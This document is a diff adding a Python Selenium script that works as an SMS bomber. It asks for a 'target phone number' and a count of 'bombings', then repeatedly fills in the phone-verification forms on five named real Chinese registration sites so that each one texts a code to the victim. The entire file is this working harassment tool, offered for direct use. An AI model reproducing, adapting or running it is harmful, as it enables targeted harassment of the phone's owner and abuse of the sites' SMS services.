@@ -1,0 +1,90 @@
+from selenium import webdriver
+import time
+import asyncio
+
+class Timing():
+    def __init__(self,loop,phone,t):
+        self.loop = loop
+        self.phone = phone
+        self.t = t
+    async def time_control(self):
+        self.tasks =[]
+        for i in range(self.t):
+            print("第%s次轰炸"%(i+1))
+            self.tasks.append(self.loop.create_task(Send(phone=self.phone).send_1()))
+            self.tasks.append(self.loop.create_task(Send(phone=self.phone).send_2()))
+            self.tasks.append(self.loop.create_task(Send(phone=self.phone).send_3()))
+            self.tasks.append(self.loop.create_task(Send(phone=self.phone).send_4()))
+            self.tasks.append(self.loop.create_task(Send(phone=self.phone).send_5()))
+            await asyncio.wait(self.tasks)
+            time.sleep(60)
+        return None
+
+class Send():
+    def __init__(self,phone):
+        self.phone = phone
+        self.driver = webdriver.Firefox(executable_path ="C:\selenium火狐驱动\geckodriver")
+    async def send_1(self):
+        self.url_1 = "https://reg.ztgame.com/"
+        self.driver.get(url=self.url_1)
+        self.inp1=self.driver.find_element_by_name("phone")
+        self.inp1.send_keys(self.phone)
+        self.driver.find_element_by_name("get_mpcode").click()
+        time.sleep(1)
+        self.driver.close()
+        return None
+
+    async def send_2(self):
+        self.url_2 = "https://passport.58.com/reg/?path=https%3A%2F%2Fzs.58.com%2F%3Futm_source%3Dlink%26spm%3Ds-41968205011985-pe-f-801.psy_startpage_site&source=58-homepage-pc&utm_source=link&spm=s-41968205011985-pe-f-801.psy_startpage_site&PGTID=0d100000-0030-3db2-162d-ccc1bf2a751c&ClickID=2"
+        self.driver.get(url=self.url_2)
+        self.inp2=self.driver.find_element_by_id("mask_body_item_phonenum")
+        self.inp2.send_keys(self.phone)
+        self.driver.find_element_by_id("mask_body_item_getcode").click()
+        time.sleep(1)
+        self.driver.close()
+        return None
+
+    async def send_3(self):
+        self.url_3 = "https://bj.5i5j.com/"
+        self.driver.get(url=self.url_3)
+        self.driver.find_element_by_link_text("注册").click()
+        self.inp3 = self.driver.find_element_by_name("username")
+        self.inp3.send_keys(self.phone)
+        self.driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div").click()
+        time.sleep(1)
+        self.driver.close()
+        return None
+
+    async def send_4(self):
+        self.url_4 = "https://login.51job.com/register.php?lang=c&from_domain=i&source=&url=%2F%2Fwww.51job.com%2Fdefault.php"
+        self.driver.get(url=self.url_4)
+        self.inp4 = self.driver.find_element_by_xpath('''//*[@id="phone"]''')
+        self.inp4.send_keys(self.phone)
+        self.driver.find_element_by_id("btn7").click()
+        time.sleep(1)
+        self.driver.close()
+        return None
+
+    async def send_5(self):
+        self.url_5 = "http://www.360doc.com/login.aspx?reurl=http://www.360doc.com/content/10/0708/14/715679_37645114.shtml"
+        self.driver.get(url=self.url_5)
+        self.driver.find_element_by_xpath("/html/body/form/div[4]/div[1]/div[3]/div[1]/a[2]").click()
+        self.inp5 = self.driver.find_element_by_id("signMobileName")
+        self.inp5.send_keys(self.phone)
+        self.driver.find_element_by_link_text("获取校验码").click()
+        time.sleep(1)
+        self.driver.close()
+        return None
+
+def main():
+    loop = asyncio.get_event_loop()
+    phone = input("输入目标手机号码:")
+    times = int(input("输入轰炸次数:"))
+    loop.run_until_complete(Timing(loop=loop,phone=phone,t=times).time_control())
+    print("轰炸结束")
+
+    return 0
+
+if __name__ == '__main__':
+    main()
+    input("按任意键退出...")
